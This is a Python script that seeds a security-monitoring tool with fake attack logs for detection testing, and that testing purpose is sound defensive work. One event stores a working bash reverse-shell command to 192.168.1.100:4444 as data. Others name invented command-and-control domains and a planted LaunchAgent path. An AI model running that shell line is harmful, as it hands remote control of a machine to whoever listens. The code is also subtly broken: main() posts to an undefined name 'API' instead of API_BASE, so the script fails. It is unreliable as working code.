#!/usr/bin/env python3
"""
Seed SecurityScarletAI with realistic test data.
Generates logs that match the DB schema and trigger detection rules.

SECURITY: Reads API token from environment variable, never hardcoded.
"""
import os
import httpx
import json
from datetime import datetime, timedelta, timezone

API_BASE = os.environ.get("SCARLET_API_URL", "http://localhost:8000/api/v1/ingest")
TOKEN = os.environ.get("SCARLET_API_TOKEN", "")

if not TOKEN:
    print("ERROR: SCARLET_API_TOKEN environment variable not set.")
    print("Set it via: export SCARLET_API_TOKEN=$(grep API_BEARER_TOKEN .env | cut -d= -f2)")
    print("Or: source .env && export SCARLET_API_TOKEN=$API_BEARER_TOKEN")
    exit(1)

def make_event(ts, host_name, source, event_category, event_type, event_action=None,
               user_name=None, process_name=None, process_pid=None,
               source_ip=None, destination_ip=None, destination_port=None,
               file_path=None, severity="info", extra=None):
    """Build a properly formatted ingest event."""
    raw = {
        "@timestamp": ts,
        "host_name": host_name,
        "source": source,
        "event_category": event_category,
        "event_type": event_type,
    }
    if event_action: raw["event_action"] = event_action
    if user_name: raw["user_name"] = user_name
    if process_name: raw["process_name"] = process_name
    if process_pid: raw["process_pid"] = process_pid
    if source_ip: raw["source_ip"] = source_ip
    if destination_ip: raw["destination_ip"] = destination_ip
    if destination_port: raw["destination_port"] = destination_port
    if file_path: raw["file_path"] = file_path
    raw["severity"] = severity
    if extra: raw.update(extra)
    return raw


def generate():
    events = []
    now = datetime.now(tz=timezone.utc)
    host = "raphael-macbook.local"

    # 1. SSH Brute Force: 10 failed + 1 success from same IP
    attacker = "185.220.101.34"
    for i in range(10):
        ts = (now - timedelta(minutes=15, seconds=i*30)).strftime("%Y-%m-%dT%H:%M:%SZ")
        events.append(make_event(ts, host, "sshd", "authentication", "start",
                                  event_action="login_failed", user_name="admin",
                                  source_ip=attacker, severity="high"))
    # Success after brute force
    ts = (now - timedelta(minutes=10)).strftime("%Y-%m-%dT%H:%M:%SZ")
    events.append(make_event(ts, host, "sshd", "authentication", "start",
                              event_action="login_success", user_name="admin",
                              source_ip=attacker, severity="critical"))

    # 2. Reverse shell: bash with /dev/tcp connection
    ts = (now - timedelta(minutes=8)).strftime("%Y-%m-%dT%H:%M:%SZ")
    events.append(make_event(ts, host, "osquery", "process", "start",
                              event_action="process_started",
                              process_name="bash", process_pid=8905,
                              severity="critical",
                              extra={"raw_data": {"command": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"}}))
    # Network connection for the reverse shell
    events.append(make_event(ts, host, "osquery", "network", "start",
                              event_action="connection_established",
                              process_name="bash", process_pid=8905,
                              destination_ip="192.168.1.100",
                              destination_port=4444,
                              severity="critical"))

    # 3. Outbound to rare ports (non-standard)
    rare_ports = [("45.208.204.90", 31337), ("23.94.78.12", 4444), ("91.134.21.55", 6667)]
    for ip, port in rare_ports:
        ts = (now - timedelta(minutes=7)).strftime("%Y-%m-%dT%H:%M:%SZ")
        events.append(make_event(ts, host, "osquery", "network", "start",
                                  event_action="connection_established",
                                  destination_ip=ip, destination_port=port,
                                  severity="high"))

    # 4. LaunchAgent persistence
    ts = (now - timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
    events.append(make_event(ts, host, "osquery", "file", "start",
                              event_action="file_created",
                              file_path="/Library/LaunchAgents/com.malware.agent.plist",
                              process_name="launchctl", process_pid=4321,
                              severity="high"))

    # 5. Privilege escalation via sudo
    ts = (now - timedelta(minutes=4)).strftime("%Y-%m-%dT%H:%M:%SZ")
    events.append(make_event(ts, host, "sudo", "authentication", "start",
                              event_action="privilege_escalation",
                              user_name="raphael", process_name="sudo",
                              process_pid=5521, severity="high",
                              extra={"raw_data": {"command": "sudo su -"}}))

    # 6. Suspicious process from /tmp
    ts = (now - timedelta(minutes=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
    events.append(make_event(ts, host, "osquery", "process", "start",
                              event_action="process_started",
                              process_name="payload", process_pid=6677,
                              file_path="/tmp/payload",
                              severity="critical"))

    # 7. Suspicious DNS queries
    suspicious_domains = ["c2.malware.xyz", "beacon.evil-corp.net", "update.trojan.ru"]
    for domain in suspicious_domains:
        ts = (now - timedelta(minutes=2)).strftime("%Y-%m-%dT%H:%M:%SZ")
        events.append(make_event(ts, host, "dns", "network", "start",
                                  event_action="dns_query",
                                  destination_ip="8.8.8.8", destination_port=53,
                                  severity="medium",
                                  extra={"raw_data": {"query": domain}}))

    # 8. Normal traffic (to reduce false positive noise)
    normal_ports = [("142.250.80.46", 443), ("151.101.1.140", 443), ("140.82.121.3", 22)]
    for ip, port in normal_ports:
        ts = (now - timedelta(minutes=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
        events.append(make_event(ts, host, "osquery", "network", "start",
                                  event_action="connection_established",
                                  destination_ip=ip, destination_port=port,
                                  severity="info"))

    return events


def main():
    events = generate()
    print(f"Sending {len(events)} events to API...")

    for i in range(0, len(events), 50):
        batch = events[i:i+50]
        resp = httpx.post(API, json=batch, headers={"Authorization": f"Bearer {TOKEN}"}, timeout=10)
        print(f"  Batch {i//50+1}: {resp.status_code} - {resp.json()}")

    print(f"\nDone! {len(events)} events ingested.")


if __name__ == "__main__":
    main()